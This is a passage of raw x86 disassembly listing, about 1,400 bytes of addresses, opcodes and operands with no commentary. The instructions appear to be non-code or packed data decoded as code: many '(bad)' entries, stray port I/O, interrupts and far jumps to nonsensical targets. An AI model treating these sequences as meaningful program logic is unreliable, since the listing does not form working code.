  41bddd:	outs   dx,DWORD PTR ds:[esi]
  41bdde:	aad    0x3f
  41bde0:	aam    0xfc
  41bde2:	(bad)  
  41bde3:	mov    ecx,0x4f3c6644
  41bde8:	adc    al,0xa1
  41bdea:	jp     0x41be4b
  41bdec:	test   al,0xf5
  41bdee:	push   cs
  41bdef:	stc    
  41bdf0:	and    eax,0x535affed
  41bdf5:	sub    DWORD PTR [ebx-0xf],ecx
  41bdf8:	out    dx,al
  41bdf9:	add    DWORD PTR [edi+0x7651f2c2],0x20
  41be00:	and    eax,0x3786b7e3
  41be05:	rcl    ah,1
  41be07:	dec    ebp
  41be08:	scas   eax,DWORD PTR es:[edi]
  41be09:	xchg   ecx,eax
  41be0a:	(bad)  
  41be0b:	call   0xc38c200a
  41be10:	mov    eax,0x6744ce33
  41be16:	ret    0x7c02
  41be19:	or     ecx,DWORD PTR [ebp+0x525b1038]
  41be1f:	mov    ds:0x3d7e1447,al
  41be24:	les    eax,FWORD PTR [ecx]
  41be26:	leave  
  41be27:	test   BYTE PTR [ecx-0x6],bl
  41be2a:	pop    ebp
  41be2b:	sub    eax,0xfa5c9f5f
  41be30:	mov    ch,0xfa
  41be32:	popa   
  41be33:	aaa    
  41be34:	xor    DWORD PTR fs:[eax-0x728127d6],esi
  41be3b:	mov    al,0x7d
  41be3d:	scas   eax,DWORD PTR es:[edi]
  41be3e:	sar    BYTE PTR [ebp-0xf],cl
  41be41:	mov    edi,0x17ab4afd
  41be46:	jmp    0x9ef75587
  41be4b:	das    
  41be4c:	mov    edi,0x39df2b09
  41be51:	cmp    DWORD PTR [eax+0x17f5cf76],ebx
  41be57:	pop    esp
  41be58:	mov    cl,0xcf
  41be5a:	mov    ah,0x90
  41be5c:	lods   eax,DWORD PTR ds:[esi]
  41be5d:	xchg   ebx,edx
  41be5f:	sti    
  41be60:	and    BYTE PTR [edx+0x7a524f20],0x3c
  41be67:	ret    
  41be68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be69:	and    eax,0x75828a54
  41be6e:	cmp    BYTE PTR [edx],bl
  41be70:	or     ebp,DWORD PTR [edi]
  41be72:	mov    edi,0xdeab5e7e
  41be77:	imul   BYTE PTR [ecx-0x6267ea]
  41be7d:	outs   dx,BYTE PTR ds:[esi]
  41be7e:	mov    dl,0xd0
  41be80:	jmp    0x8085:0xdeff7fec
  41be87:	ss sub eax,0x79b19031
  41be8d:	bound  ecx,QWORD PTR [eax]
  41be8f:	sti    
  41be90:	jmp    0x726c:0x3255b19a
  41be97:	inc    esi
  41be98:	dec    edx
  41be99:	pop    eax
  41be9a:	adc    BYTE PTR [edi+0xb],al
  41be9d:	test   eax,0x8ec6d6f2
  41bea2:	jle    0x41be9e
  41bea4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bea5:	push   ebx
  41bea6:	shr    DWORD PTR [ecx-0x1da4332c],1
  41beac:	xchg   esi,eax
  41bead:	push   cs
  41beae:	sbb    dh,0x6c
  41beb1:	out    0x90,al
  41beb3:	int3   
  41beb4:	cli    
  41beb5:	cmp    cl,al
  41beb7:	jecxz  0x41bf05
  41beb9:	nop
  41beba:	js     0x41be9a
  41bebc:	cld    
  41bebd:	xlat   BYTE PTR ds:[ebx]
  41bebe:	add    eax,0xb0f7e9c9
  41bec3:	test   BYTE PTR [edi-0xbe66f6],dl
  41bec9:	gs pop ebx
  41becb:	fwait
  41becc:	mul    BYTE PTR [esp+ebx*4+0x29]
  41bed0:	and    eax,DWORD PTR [eax-0x660aef55]
  41bed6:	and    al,al
  41bed8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bed9:	cld    
  41beda:	push   cs
  41bedb:	(bad)  
  41bedc:	into   
  41bedd:	jnp    0x41be71
  41bedf:	mov    esi,0xaa380457
  41bee4:	pop    edx
  41bee5:	pop    ebx
  41bee6:	dec    esi
  41bee7:	push   es
  41bee8:	mov    ecx,0x90e523f6
  41beed:	in     eax,dx
  41beee:	in     al,0xdf
  41bef0:	mov    ebp,eax
  41bef2:	inc    esi
  41bef3:	push   ss
  41bef4:	rcl    BYTE PTR cs:[edi+0x44],cl
  41bef8:	xlat   BYTE PTR ds:[ebx]
  41bef9:	das    
  41befa:	repz add bl,BYTE PTR [ecx+0x30cf4298]
  41bf01:	cld    
  41bf02:	int    0xce
  41bf04:	xor    BYTE PTR [esi-0x10ad8dad],bh
  41bf0a:	sbb    ch,ch
  41bf0c:	fsubr  st,st(1)
  41bf0e:	push   es
  41bf0f:	or     edi,eax
  41bf11:	data16 mov bl,0xdc
  41bf14:	push   cs
  41bf15:	aas    
  41bf16:	aam    0xac
  41bf18:	adc    BYTE PTR [edx-0x3],al
  41bf1b:	aaa    
  41bf1c:	mov    al,0x73
  41bf1e:	push   cs
  41bf1f:	iret   
  41bf20:	call   0xefed2f54
  41bf25:	cmp    eax,0x826e2c3d
  41bf2a:	cmp    BYTE PTR [esi],0x7e
  41bf2d:	mov    ch,0x61
  41bf2f:	std    
  41bf30:	jae    0x41bfa0
  41bf32:	jecxz  0x41bf65
  41bf34:	push   edx
  41bf35:	dec    edi
  41bf36:	mov    fs,WORD PTR [eax+0x655a6444]
  41bf3c:	bswap  esp
  41bf3e:	sar    BYTE PTR [eax-0x6f],0xbd
  41bf42:	jl     0x41bf60
  41bf44:	add    DWORD PTR [ebx+0x46],ecx
  41bf47:	sar    BYTE PTR [edx+0xd1a670d],1
  41bf4d:	iret   
  41bf4e:	push   esp
  41bf4f:	mov    ah,0x8
  41bf51:	ret    0xb8c7
  41bf54:	mov    eax,0xb5c83c13
  41bf59:	stos   BYTE PTR es:[edi],al
  41bf5a:	jnp    0x41bf2c
  41bf5c:	into   
  41bf5d:	pop    edi
  41bf5e:	bound  esp,QWORD PTR [eax-0x2c]
  41bf61:	lea    ebx,[esi]
  41bf63:	inc    ecx
  41bf64:	jl     0x41bf9c
  41bf66:	sub    dh,BYTE PTR [ebp+0x7f]
  41bf69:	(bad)  
  41bf6a:	fld    QWORD PTR [eax+0x2a5878d8]
  41bf70:	adc    al,0xb7
  41bf72:	mov    DWORD PTR [ebp+0x1fa36351],edi
  41bf78:	lock sbb eax,0xfaa85f80
  41bf7e:	push   ecx
  41bf7f:	retf   
  41bf80:	pop    DWORD PTR [ecx+0x53b49bcc]
  41bf86:	dec    ebx
  41bf87:	xchg   edx,eax
  41bf88:	jecxz  0x41bfc5
  41bf8a:	pop    edx
  41bf8b:	push   ss
  41bf8c:	pop    ss
  41bf8d:	rcl    BYTE PTR ds:0x5cf8a66e,cl
  41bf93:	aas    
  41bf94:	xor    DWORD PTR [ebp+0x14aac89a],edx
  41bf9a:	arpl   WORD PTR [edx],di
  41bf9c:	sbb    eax,0xb188ffc8
  41bfa1:	test   DWORD PTR [esi-0x653000d4],esi
  41bfa7:	lods   eax,DWORD PTR ds:[esi]
  41bfa8:	sub    bh,BYTE PTR [ecx]
  41bfaa:	fist   DWORD PTR [edx]
  41bfac:	xchg   DWORD PTR [di+0x1235],ecx
  41bfb1:	fimul  DWORD PTR [eax-0x5a]
  41bfb4:	test   eax,0xc747a9b3
  41bfb9:	or     ch,ch
  41bfbb:	inc    ebp
  41bfbc:	add    eax,0x239267
  41bfc1:	inc    ecx
  41bfc2:	or     eax,0x709f3ba8
  41bfc7:	adc    esp,DWORD PTR [edi+0x25a3090a]
  41bfcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfce:	jno    0x41c042
  41bfd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bfd1:	sub    esi,DWORD PTR ds:0x15324851
  41bfd7:	sbb    BYTE PTR [esi],dh
  41bfd9:	mov    BYTE PTR [ebp-0x77],ah
  41bfdc:	jno    0x41bf69
  41bfde:	cwde   
  41bfdf:	cmp    bl,dl
  41bfe1:	dec    edi
  41bfe2:	cmp    BYTE PTR [ecx-0x50],dl
  41bfe5:	lock sub esi,ebx
  41bfe8:	gs jge 0x41bf8e
  41bfeb:	sbb    eax,0x30803233
  41bff0:	xchg   DWORD PTR [edi+0x5a],esp
  41bff3:	shl    DWORD PTR [ebx],0x2c
  41bff6:	add    DWORD PTR [ebx+ebx*4-0x7c],ecx
  41bffa:	adc    eax,0x359450b
  41bfff:	cmovg  edi,DWORD PTR [edi-0x5253551d]
  41c006:	adc    al,BYTE PTR [ecx-0x66]
  41c009:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c00a:	or     al,0xdd
  41c00c:	mov    dl,0x35
  41c00e:	mov    esp,0x2065c7b2
  41c013:	cmc    
  41c014:	sub    esi,DWORD PTR [edi-0x5c6ceb7c]
  41c01a:	cli    
  41c01b:	pop    ds
  41c01c:	cmc    
  41c01d:	int3   
  41c01e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c01f:	pushf  
  41c020:	loopne 0x41bfa5
  41c022:	sub    BYTE PTR [edx+0x73],0x8f
  41c026:	bound  esp,QWORD PTR [eax-0x1d]
  41c029:	mov    ecx,0x2a02457f
  41c02e:	add    DWORD PTR [edx+0x5be7c01],edi
  41c034:	xchg   BYTE PTR [eax-0x2797bba2],cl
  41c03a:	mov    esp,0xb4735882
  41c03f:	jg     0x41c094
  41c041:	xor    ah,0xeb
  41c044:	icebp  
  41c045:	dec    ebp
  41c046:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c047:	pop    ebp
  41c048:	push   esp
  41c049:	imul   esp,DWORD PTR [edi+0xe1f9380],0x61
  41c050:	or     BYTE PTR [edi],dl
  41c052:	imul   edx,DWORD PTR [eax+0x2eb4649],0x733706c8
  41c05c:	xchg   DWORD PTR [ebx-0x1],edx
  41c05f:	mov    dh,BYTE PTR [edi+0x43]
  41c062:	mov    ds:0xc68cc87e,al
  41c067:	mov    ?,WORD PTR [esi+0x28]
  41c06a:	xchg   al,ch
  41c06c:	pop    edi
  41c06d:	sbb    BYTE PTR [edx+0x535f89f],al
  41c073:	mov    al,ds:0x11e33b30
  41c078:	xchg   ebp,eax
  41c079:	out    dx,al
  41c07a:	es mov edx,0x2e
  41c080:	add    BYTE PTR [eax],al
  41c082:	mov    dh,0x3a
  41c084:	out    0x1,eax
  41c086:	out    dx,eax
  41c087:	(bad)  
  41c089:	mov    edi,0xdf2dff43
  41c08e:	fldenv [ebx+0x3c682b90]
  41c094:	add    DWORD PTR [eax],eax
  41c096:	repz add al,0x0
  41c099:	add    BYTE PTR [ebp+0x29],bl
  41c09c:	retf   
  41c09d:	js     0x41c107
  41c09f:	dec    esi
  41c0a0:	int3   
  41c0a1:	xlat   BYTE PTR ds:[ebx]
  41c0a2:	xadd   BYTE PTR ds:0x8bcfe64e,al
  41c0a9:	repnz loope 0x41c127
  41c0ac:	xchg   BYTE PTR fs:[esi+edx*2+0x4b],cl
  41c0b1:	jbe    0x41c12c
  41c0b3:	ret    0x1753
  41c0b6:	mov    edi,0x388c73c6
  41c0bb:	inc    ebx
  41c0bc:	adc    eax,0xf8e9bec9
  41c0c1:	push   ebx
  41c0c2:	sbb    al,0x6b
  41c0c4:	retf   0x92c0
  41c0c7:	adc    ecx,0x6c
  41c0ca:	cmp    cl,bh
  41c0cc:	sub    al,0x55
  41c0ce:	mov    esi,0xef58dc07
  41c0d3:	addr16 clc 
  41c0d5:	dec    ebp
  41c0d6:	and    DWORD PTR [ebx],edi
  41c0d8:	int    0xd0
  41c0da:	inc    edx
  41c0db:	jo     0x41c09e
  41c0dd:	pop    es
  41c0de:	or     edx,DWORD PTR [eax+ecx*1+0x7d6caea9]
  41c0e5:	jmp    0x279:0x53bef411
  41c0ec:	(bad)  
  41c0ee:	mov    cl,0xfe
  41c0f0:	xor    edx,DWORD PTR [ebp-0x4eb9c6d4]
  41c0f6:	pusha  
  41c0f7:	or     edx,DWORD PTR [edx+0x3424c952]
  41c0fd:	int    0xdb
  41c0ff:	das    
  41c100:	push   ecx
  41c101:	popa   
  41c102:	outs   dx,BYTE PTR ds:[esi]
  41c103:	stos   BYTE PTR es:[edi],al
  41c104:	aas    
  41c105:	push   0x9b3e5de9
  41c10a:	cmp    al,0x72
  41c10c:	ins    DWORD PTR es:[edi],dx
  41c10d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c10e:	(bad)  
  41c110:	pop    esp
  41c111:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c112:	aam    0x63
  41c114:	cmp    BYTE PTR [edx],ah
  41c116:	shl    BYTE PTR [ecx],cl
  41c118:	pop    edx
  41c119:	idiv   BYTE PTR [edi+0x72]
  41c11c:	and    al,0x44
  41c11e:	fisttp DWORD PTR [ecx-0x2230835]
  41c124:	stos   DWORD PTR es:[edi],eax
  41c125:	xchg   DWORD PTR [esi+0x7cde9f39],eax
  41c12b:	mov    ecx,0xd0ac646
  41c130:	gs pop ebx
  41c132:	mov    edx,0x10843177
  41c137:	lods   eax,DWORD PTR ds:[esi]
  41c138:	xchg   ebx,eax
  41c139:	in     al,dx
  41c13a:	cmp    DWORD PTR [edi-0x12fc9941],edx
  41c140:	cmc    
  41c141:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c142:	xchg   esp,eax
  41c143:	adc    ebp,ebx
  41c145:	pusha  
  41c146:	stos   DWORD PTR es:[edi],eax
  41c147:	leave  
  41c148:	out    dx,eax
  41c149:	data16 test al,0x39
  41c14c:	test   DWORD PTR [ebx+0x4489abf3],ebp
  41c152:	lods   al,BYTE PTR ds:[esi]
  41c153:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c154:	in     eax,dx
  41c155:	cwde   
  41c156:	adc    al,0x12
  41c158:	(bad)  
  41c159:	addr16 dec esp
  41c15b:	mov    BYTE PTR [esi+ebp*8],0x1f
  41c15f:	rol    ah,1
  41c161:	out    0xac,al
  41c163:	xchg   edi,eax
  41c164:	repz int 0xf9
  41c167:	pusha  
  41c168:	lods   al,BYTE PTR ds:[esi]
  41c169:	xchg   edi,eax
  41c16a:	mov    edx,0xc786c73f
  41c16f:	xchg   ebp,eax
  41c170:	inc    esi
  41c171:	pop    edx
  41c172:	xchg   edi,eax
  41c173:	pop    cx
  41c175:	xor    al,0xa6
  41c177:	jg     0x41c1e8
  41c179:	jne    0x41c19b
  41c17b:	mov    BYTE PTR [ecx+0x45d319ef],dl
  41c181:	hlt    
  41c182:	dec    edi
  41c183:	daa    
  41c184:	cdq    
  41c185:	and    eax,0xd95ddaa0
  41c18a:	jo     0x41c15e
  41c18c:	mov    ds:0xf46e2a95,al
  41c191:	enter  0xe178,0xe0
  41c195:	scas   eax,DWORD PTR es:[edi]
  41c196:	or     esp,DWORD PTR [esi+0x38]
  41c199:	adc    al,0xe8
  41c19b:	(bad)  
  41c19c:	daa    
  41c19d:	test   BYTE PTR [esi+0x10],ah
  41c1a0:	pushf  
  41c1a1:	sbb    al,0x38
  41c1a3:	aam    0x4e
  41c1a5:	scas   eax,DWORD PTR es:[edi]
  41c1a6:	retf   0xfdb
  41c1a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1aa:	sub    al,0x6
  41c1ac:	or     eax,DWORD PTR [ebp-0x2f21ef5]
  41c1b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1b3:	in     al,0xcf
  41c1b5:	and    edx,DWORD PTR [ecx-0x539b96f]
  41c1bb:	sbb    DWORD PTR [edi],0xf68ab8c2
  41c1c1:	xlat   BYTE PTR ds:[ebx]
  41c1c2:	pop    sp
  41c1c4:	adc    ah,dl
  41c1c6:	pop    es
  41c1c7:	or     cl,BYTE PTR [esi+ebx*8-0x42278b66]
  41c1ce:	(bad)  
  41c1cf:	cli    
  41c1d0:	cmp    al,0x60
  41c1d2:	sbb    BYTE PTR [edx+0x4e],0x60
  41c1d6:	cmp    al,0x71
  41c1d8:	ins    DWORD PTR es:[edi],dx
  41c1d9:	je     0x41c18a
  41c1db:	mov    edi,0x8936249
  41c1e0:	dec    ebx
  41c1e1:	pop    eax
  41c1e2:	inc    ebp
  41c1e3:	call   0xd2b1:0xa6376f83
  41c1ea:	mov    dl,0x10
  41c1ec:	lea    ebp,[eax-0x3630523d]
  41c1f2:	add    ecx,DWORD PTR [esi-0x790b404d]
  41c1f8:	mov    ds:0x1c59c83d,al
  41c1fd:	xchg   BYTE PTR [ecx-0x13],dl
  41c200:	mov    ds:0x1b8ad435,al
  41c205:	add    BYTE PTR [edi],0xb5
  41c208:	lods   eax,DWORD PTR ds:[esi]
  41c209:	(bad)  
  41c20a:	retf   
  41c20b:	xchg   edx,eax
  41c20c:	pop    ebp
  41c20d:	inc    BYTE PTR [esi]
  41c20f:	mov    cl,0x7f
  41c211:	(bad)  
  41c212:	pop    ds
  41c213:	ins    BYTE PTR es:[edi],dx
  41c214:	mov    eax,ds:0x7af69628
  41c219:	adc    BYTE PTR fs:[edx+eiz*8+0xe],bl
  41c21e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c21f:	es jp  0x41c1af
  41c222:	mov    al,ds:0x2afb1bcf
  41c227:	fstp   TBYTE PTR [edi]
  41c229:	push   edx
  41c22a:	pop    esp
  41c22b:	(bad)  
  41c22c:	icebp  
  41c22d:	stc    
  41c22e:	in     eax,dx
  41c22f:	and    ebp,DWORD PTR [edi-0x5524ff70]
  41c235:	mov    esp,esp
  41c237:	int3   
  41c238:	sbb    DWORD PTR [ebp-0xb],esi
  41c23b:	jle    0x41c2ad
  41c23d:	std    
  41c23e:	pop    ds
  41c23f:	(bad)  
  41c241:	test   al,0xa1
  41c243:	ror    DWORD PTR [eax+0x6479937b],cl
  41c249:	xor    ch,bl
  41c24b:	mov    al,ds:0x28baf36f
  41c250:	mov    ebx,0xe2f95a5b
  41c255:	fld    QWORD PTR [eax+0x28]
  41c258:	popf   
  41c259:	mov    ds:0x678ffd2e,al
  41c25e:	pop    edx
  41c25f:	ret    0x8026
  41c262:	repz sti 
  41c264:	pushf  
  41c265:	mov    edi,0x83391af0
  41c26a:	cmp    dh,dl
  41c26c:	push   0xffffffa2
  41c26e:	xchg   ebx,eax
  41c26f:	test   BYTE PTR [edi],bl
  41c271:	enter  0x8b7d,0x8f
  41c275:	adc    eax,0x3100f6ce
  41c27a:	xor    dl,BYTE PTR [edi]
  41c27c:	jb     0x41c244
  41c27e:	(bad)  
  41c27f:	push   esi
  41c280:	add    bh,BYTE PTR [edi-0x1f]
  41c283:	div    BYTE PTR [eax-0x12]
  41c286:	pop    eax
  41c287:	inc    esi
  41c288:	xlat   BYTE PTR ds:[ebx]
  41c289:	jle    0x41c297
  41c28b:	out    0x31,eax
  41c28d:	sar    dl,cl
  41c28f:	popa   
  41c290:	imul   eax,DWORD PTR [eax-0x6f8c4345],0x7a
  41c297:	mov    ebp,0x235f991e
  41c29c:	fsubp  st(0),st
  41c29e:	cld    
  41c29f:	data16 outs dx,BYTE PTR ds:[esi]
  41c2a1:	mov    al,0x99
  41c2a3:	cs mov ebx,0x54d9e2b8
  41c2a9:	bound  edi,QWORD PTR [edx+0x77101c27]
  41c2af:	mov    edx,DWORD PTR [ecx-0x15]
  41c2b2:	js     0x41c254
  41c2b4:	cwde   
  41c2b5:	dec    edx
  41c2b6:	repnz cmc 
  41c2b8:	or     DWORD PTR [ebp-0x79f461b9],0xffffffeb
  41c2bf:	ins    DWORD PTR es:[edi],dx
  41c2c0:	add    eax,0x7841b1b2
  41c2c5:	mov    cl,0xbe
  41c2c7:	ror    DWORD PTR [edx],1
  41c2c9:	cld    
  41c2ca:	in     eax,0xc2
  41c2cc:	inc    esp
  41c2cd:	cmp    al,0x27
  41c2cf:	call   DWORD PTR ds:0xb26c8fc9
  41c2d5:	ja     0x41c32b
  41c2d7:	(bad)  
  41c2d8:	pushf  
  41c2d9:	sub    BYTE PTR [ecx],bh
  41c2db:	mov    dh,0x34
  41c2dd:	mov    edx,0xb772570
  41c2e2:	push   ecx
  41c2e3:	and    ebp,DWORD PTR [esi-0x373072f4]
  41c2e9:	mov    ebp,0xe6e34cfc
  41c2ee:	xor    BYTE PTR [eax+ecx*4],ah
  41c2f1:	or     eax,esp
  41c2f3:	int    0x79
  41c2f5:	add    dl,BYTE PTR [edi]
  41c2f7:	test   DWORD PTR [ebp+ecx*2-0x29457402],ebp
  41c2fe:	nop
  41c2ff:	aaa    
  41c300:	popa   
  41c301:	mov    bl,dh
  41c303:	adc    eax,0xffbb402a
  41c308:	mov    cl,0xf0
  41c30a:	adc    ebx,DWORD PTR [edx]
  41c30c:	or     eax,0xe6c316dc
  41c311:	shl    BYTE PTR [ecx],1
  41c313:	jae    0x41c2ec
  41c315:	mov    al,0x87
  41c317:	in     al,0x48
  41c319:	sub    DWORD PTR [esp+edx*8],ecx
  41c31c:	fisubr WORD PTR [ebp+0x41251bd1]
  41c322:	ror    BYTE PTR [esi-0x32],cl
  41c325:	and    al,0x79
  41c327:	movnti DWORD PTR [ecx],esi
  41c32a:	in     al,dx
  41c32b:	(bad)  
  41c32c:	clc    
  41c32d:	sbb    esi,DWORD PTR [eax]
  41c32f:	push   ss
  41c330:	test   DWORD PTR [esi-0x46],edi
  41c333:	xchg   ebx,eax
  41c334:	ins    DWORD PTR es:[edi],dx
  41c335:	jp     0x41c308
  41c337:	mov    dl,0xd8
  41c339:	mov    ebx,0x30e0a343
  41c33e:	daa    
  41c33f:	mov    dh,0xe0
  41c341:	lock jecxz 0x41c2f9
  41c344:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c345:	in     al,dx
  41c346:	adc    al,0xc
  41c348:	xchg   edx,eax
  41c349:	sub    edx,DWORD PTR [eax+edx*8-0x3d2506f4]
  41c350:	jbe    0x41c324
  41c352:	rcl    eax,1
  41c354:	and    cl,bh
  41c356:	retf   0x60c4
  41c359:	jmp    0x8ef05ace
  41c35e:	aam    0x43
  41c360:	in     eax,0x43
  41c362:	(bad)  
  41c363:	cmp    BYTE PTR [ecx+0x659575d4],al
  41c369:	add    ch,ah
  41c36b:	mov    esi,0x75ea6b1c
  41c370:	test   DWORD PTR [ebx-0x4f],esp
  41c373:	addr16 inc edi
  41c375:	stc    
  41c376:	or     ebp,DWORD PTR [edi]
  41c378:	mov    esp,0xcba43131
  41c37d:	cmp    eax,0x3289bdc6
  41c382:	mov    ebp,0xa3aaebd
  41c387:	xor    al,0xea
  41c389:	loopne 0x41c3e4
  41c38b:	lock push eax
  41c38d:	cld    
  41c38e:	cmp    al,0x6d
  41c390:	fsubr  DWORD PTR [edx-0xf]
  41c393:	in     al,0x19
  41c395:	gs push esp
  41c397:	sub    DWORD PTR [ecx-0x3ecfc17b],ecx
  41c39d:	pop    ebp
  41c39e:	dec    esp
  41c39f:	lock fwait
  41c3a1:	mov    dh,0xed
  41c3a3:	sub    al,0xda
  41c3a5:	outs   dx,BYTE PTR ds:[esi]
  41c3a6:	push   esp
  41c3a7:	mov    ch,BYTE PTR [edx-0x71df32f7]
  41c3ad:	mov    eax,ds:0x76c6db64
  41c3b2:	icebp  
  41c3b3:	pusha  
  41c3b4:	sbb    eax,0xcf205c87
  41c3b9:	rsqrtps xmm6,xmm5
  41c3bc:	(bad)  
  41c3bd:	out    dx,eax
  41c3be:	imul   edx,DWORD PTR [ecx],0xffffffa3
  41c3c1:	addr16 mov edi,0x93af6c91
  41c3c7:	adc    BYTE PTR [edx+0x16],dl
  41c3ca:	xor    esi,DWORD PTR ds:0xf16dca7
  41c3d0:	test   al,0x35
  41c3d2:	sti    
  41c3d3:	ret    0xf83
  41c3d6:	add    al,0xca
  41c3d8:	adc    DWORD PTR ds:0x7d654302,esi
  41c3de:	pop    esi
  41c3df:	sbb    DWORD PTR [eax+0x37],ebx
  41c3e2:	sbb    bl,dl
  41c3e4:	ins    BYTE PTR es:[edi],dx
  41c3e5:	mov    al,ds:0xa1121e41
  41c3ea:	sbb    eax,0xd8268669
  41c3ef:	xlat   BYTE PTR ds:[ebx]
  41c3f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3f1:	inc    esp
  41c3f2:	cli    
  41c3f3:	rcl    DWORD PTR [ebx+0x5b0fa081],cl
  41c3f9:	bound  ebx,QWORD PTR [ecx-0x74]
  41c3fc:	xor    ecx,esp
  41c3fe:	mov    ds:0xf9a006e3,al
  41c403:	lods   al,BYTE PTR ds:[esi]
  41c404:	mov    esi,0x76f0cac7
  41c409:	inc    esi
  41c40a:	fs mov al,0xa9
  41c40d:	in     eax,0x26
  41c40f:	enter  0x3cb3,0x15
  41c413:	out    0xd5,eax
  41c415:	jns    0x41c48a
  41c417:	push   ecx
  41c418:	or     ah,dh
  41c41a:	rcl    DWORD PTR [eax+0x41],1
  41c41d:	sahf   
  41c41e:	jecxz  0x41c474
  41c420:	test   DWORD PTR [ebx-0x5],esi
  41c423:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c424:	pop    ss
  41c425:	mov    ebp,0x28d3e727
  41c42a:	fdivr  DWORD PTR [esi]
  41c42c:	add    edi,DWORD PTR [eax+0x79a1876e]
  41c432:	hlt    
  41c433:	mov    esi,0x6870bd2
  41c438:	dec    ebp
  41c439:	sti    
  41c43a:	clc    
  41c43b:	das    
  41c43c:	xchg   edi,eax
  41c43d:	mov    DWORD PTR [ecx+0x35c6d4e3],eax
  41c443:	fwait
  41c444:	cmp    DWORD PTR [eax+0x149c0aa1],ecx
  41c44a:	retf   0xab6e
  41c44d:	std    
  41c44e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c44f:	and    cl,ah
  41c451:	ss push esi
  41c453:	(bad)  
  41c454:	sar    BYTE PTR [eax+0x76eb50d8],cl
  41c45a:	adc    DWORD PTR [esi],0xffffff99
  41c45d:	retf   
  41c45e:	mov    edi,0xe94b5f96
  41c463:	sbb    al,0xa
  41c465:	ss popa 
  41c467:	jae    0x41c3ff
  41c469:	adc    edx,DWORD PTR [ebx+0x6e]
  41c46c:	xor    BYTE PTR [edx],cl
  41c46e:	ret    
  41c46f:	mov    bl,0xa3
  41c471:	dec    edx
  41c472:	addr16 gs push 0x5d
  41c476:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c477:	jo     0x41c45f
  41c479:	je     0x41c486
  41c47b:	push   cx
  41c47d:	outs   dx,BYTE PTR ds:[esi]
  41c47e:	in     al,dx
  41c47f:	mov    ebx,0x62e0b5ba
  41c484:	loop   0x41c4be
  41c486:	mov    ch,0x4c
  41c488:	cmp    eax,0x7eef3045
  41c48d:	push   esi
  41c48e:	popa   
  41c48f:	mov    gs,WORD PTR [eax-0x27]
  41c492:	push   ss
  41c493:	(bad)  
  41c494:	enter  0x2489,0x96
  41c498:	sub    BYTE PTR [ebx-0x40],ch
  41c49b:	jmp    0x41c4eb
  41c49d:	loope  0x41c46d
  41c49f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4a0:	adc    eax,0xb5424684
  41c4a5:	mov    ch,0xfc
  41c4a7:	or     eax,0x99313f04
  41c4ac:	inc    esp
  41c4ad:	push   es
  41c4ae:	jle    0x41c464
  41c4b0:	push   esp
  41c4b1:	push   cs
  41c4b2:	or     DWORD PTR [edi],eax
  41c4b4:	dec    esi
  41c4b5:	or     al,0xdd
  41c4b7:	ins    BYTE PTR es:[edi],dx
  41c4b8:	cmp    esp,ebp
  41c4ba:	retf   0x13e5
  41c4bd:	div    DWORD PTR [edi]
  41c4bf:	xchg   BYTE PTR [eax],al
  41c4c1:	push   ebp
  41c4c2:	cmp    DWORD PTR [ebx],esp
  41c4c4:	mov    ah,0x49
  41c4c6:	mov    dl,0xca
  41c4c8:	sub    al,0x2a
  41c4ca:	xchg   edi,eax
  41c4cb:	mov    ?,edx
  41c4cd:	or     dh,al
  41c4cf:	(bad)  
  41c4d0:	dec    esp
  41c4d1:	test   al,0xc2
  41c4d3:	adc    DWORD PTR [esi],edi
  41c4d5:	add    al,BYTE PTR [ebp+ebp*1+0x6b]
  41c4d9:	sub    bl,BYTE PTR [edi+eax*1-0x47]
  41c4dd:	xchg   ecx,eax
  41c4de:	in     eax,dx
  41c4df:	xor    BYTE PTR ds:0x77cee687,ch
  41c4e5:	xchg   DWORD PTR [esi+0x6a],ecx
  41c4e8:	aas    
  41c4e9:	and    esp,ecx
  41c4eb:	arpl   WORD PTR [ecx],bx
  41c4ed:	xor    BYTE PTR [edx+0x28],bl
  41c4f0:	xchg   edx,eax
  41c4f1:	sbb    al,0xd5
  41c4f3:	fild   WORD PTR [edi]
  41c4f5:	mov    al,ds:0xfc645020
  41c4fa:	adc    BYTE PTR [ecx+0x53426f65],0x2c
  41c501:	in     al,dx
  41c502:	(bad)  
  41c503:	jne    0x41c4bc
  41c505:	rol    BYTE PTR [ecx+ebp*1],1
  41c508:	and    DWORD PTR [esi+0x2c02320f],0xe6887256
  41c512:	jb     0x41c4bd
  41c514:	jno    0x41c4be
  41c516:	stos   DWORD PTR es:[edi],eax
  41c517:	or     al,0x6e
  41c519:	call   FWORD PTR [esi+0x44]
  41c51c:	adc    BYTE PTR [ebx-0x24fe90b9],al
  41c522:	pop    ds
  41c523:	add    al,0x88
  41c525:	enter  0x5091,0xbc
  41c529:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c52a:	imul   edx,DWORD PTR [edi+0x648a0a1d],0x63a2d3bb
  41c534:	ins    DWORD PTR es:[edi],dx
  41c535:	cmp    BYTE PTR [edi-0x11],bl
  41c538:	mov    ds:0xc484e6be,eax
  41c53d:	(bad)  
  41c53e:	out    dx,eax
  41c53f:	and    eax,0x2cf8c258
  41c544:	(bad)  [esi]
  41c546:	cli    
  41c547:	rol    bl,0x57
  41c54a:	inc    edx
  41c54b:	or     esi,ebp
  41c54d:	out    dx,al
